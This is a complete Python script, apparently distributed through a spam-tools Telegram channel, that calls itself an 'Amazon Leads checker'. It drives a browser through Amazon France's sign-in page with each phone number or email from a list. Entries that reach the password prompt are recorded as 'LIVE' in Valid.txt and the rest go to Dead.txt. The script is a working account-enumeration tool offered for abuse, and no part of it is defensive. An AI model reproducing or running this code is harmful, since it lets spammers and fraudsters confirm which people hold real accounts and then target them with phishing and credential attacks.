#coded by hrackedz  https://t.me/kickflap
import os

from time import sleep
try :

  from selenium.webdriver.common.by import By
  from selenium.webdriver.support import expected_conditions as ec
  from selenium import webdriver
  from selenium.webdriver.support.ui import WebDriverWait
except ImportError:
  print ("Trying to Install required module: selenium\n")
  os.system('python -m pip install selenium')  

from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as ec
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
try:

  from webdriver_manager.chrome import ChromeDriverManager
except ImportError:
  print ("Trying to Install required module: webdriver_manager\n")
  os.system('python -m pip install webdriver-manager')
from webdriver_manager.chrome import ChromeDriverManager	


def clear():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][os.name == 'nt'])
   

old_number=[]
b = """\033[41;1m


        ( /(                         )          )\ )    ( /( 
        )\())  (        )         ( /(     (   (()/(    )\())
        ((_)\   )(    ( /(    (    )\())   ))\   /(_))  ((_) 
        _((_) (()\   )(_))   )\  ((_)\   /((_) (_))_    _((_)
        | || |  ((_) ((_)_   ((_) | |(_) (_))    |   \  |_  /
        | __ | | '_| / _` | / _|  | / /  / -_)   | |) |  / / 
        |_||_| |_|   \__,_| \__|  |_\_\  \___|   |___/  /___|\033[0m  
                                  
          Amazon Leads checker V2.0
          For premium stuff 
          Telegram : @kickflap
          Channel : https://t.me/spammer_tools
          


"""

chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument("--log-level=3")
chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
driver = webdriver.Chrome(ChromeDriverManager().install(), chrome_options=chrome_options)
clear()
print(b)
file = input('Your phone or mail list ======================> ')
for phone in open(file,'r').readlines():
 try:
  phone=phone.strip().replace(' ','').replace('\n','')
  if phone in old_number:
    print(phone+" old checked")
    continue
  driver.get("https://www.amazon.fr/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.fr%2F%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=frflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&")
  sleep(1)
  try:
    inpt=driver.find_element(By.XPATH,'//*[@id="ap_email"]')
    submit=driver.find_element(By.XPATH,'//*[@id="continue"]')
    inpt.send_keys(phone)
    submit.submit()
    sleep(1)
    try:
      password=driver.find_element(By.XPATH,'//*[@id="ap_password"]')
      print("\033[32;1mLIVE\033[0m | "+phone+" | [  Valid  ]")
      open('Valid.txt','a').write(phone+"\n")
    except:
      print("\033[31;1mDIE\033[0m | "+phone+" | [ Dead  ]")
      open('Dead.txt','a').write(phone+"\n")
  except Exception as e:
     print(phone+" error")
 except Exception as e:
   print(e)
   